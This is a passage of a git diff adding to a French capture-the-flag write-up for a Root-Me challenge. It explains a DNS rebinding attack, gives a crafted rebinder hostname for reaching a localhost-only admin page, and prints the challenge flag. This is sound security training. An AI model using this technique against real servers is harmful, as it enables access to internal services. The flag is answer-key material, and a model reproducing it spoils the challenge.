@@ -25,7 +25,50 @@ Il faut réussir à voir la page `http://challenge01.root-me.org:54022/admin` ca
 
 Nous savons aussi que la page web ne peut pas afficher des pages locales.
 
+Comme le nom du chall l'indique, on va essayer de faire du `DNS Rebinding`. Il nous faut donc un serveur DNS avec un TTL de 0, ou sinon un outil qui nous permet de faire l'attaque.
 
+On peut décrire l'attaque en trois étapes:
+ - On entre une URL sur le site
+ - Le serveur effectue une requête DNS afin de trouver l'adresse Ip correspondante, et reçoit une première adresse Ip publique
+- Le serveur va effectuer une requête GET vers ce même Ip, sauf qu'à ce même moment, notre serveur DNS va lui envoyer une nouvelle Ip correspondante à l'URL, cette fois étant l'ip du localhost `127.0.0.1`
+
+Nous avons trouvé [un outil](https://lock.cmpxchg8b.com/rebinder.html) super util qui nous permet de faire cela.
+
+La différence entre cet outil et un vrai serveur DNS est que l'outil renvoie une réponse aléatoire entre deux ips, alors que qu'un vrai serveur permet de renvoyer deux requêtes différentes et spécifiques.
+
+On va maintenant mener l'attaque, en utilisant comme Ip publique `8.8.8.8`, Ce qui nous donne cette URL `7f000001.08080808.rbndr.us`.
+
+Il faut aussi ajouter là sous répertoire et le port à l'URL `http://7f000001.08080808.rbndr.us:54022/admin`.
+
+Vu que l'outil renvoie des réponses aléatoires entre les deux ips, il faut envoyer quelques requêtes vers l'URL avant de voir le flag. On peut utiliser burp proxy afin de voir l'historique des requetes http, ce qui nous permet de spammer la page.
+
+On retrouve donc le flag:
+
+```
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 681
+Server: Werkzeug/1.0.1 Python/3.8.10
+Date: Sun, 14 Jan 2024 18:25:27 GMT
+
+
+        <html>
+            <head>
+                <title>Admin page</title>
+                <link rel="stylesheet" href="/static/bootstrap.min.css">
+            </head>
+            <body style="background:pink">
+                <br/>
+                <h1 class="d-flex justify-content-center">Well done!</h1>
+                <h3 class="d-flex justify-content-center">Have a cookie. Admins love cookies.</h1>
+                <h6 class="d-flex justify-content-center">Flag: u1reSog00dWizDNSR3bindindon
+</h6>
+                <div class="d-flex justify-content-center">
+                    <img src="/static/cookie.png"/>
+                </div>
+            </body>
+        </html>
+```
 
 🌞 **Proposer une version du code qui n'est pas vulnérable**
 
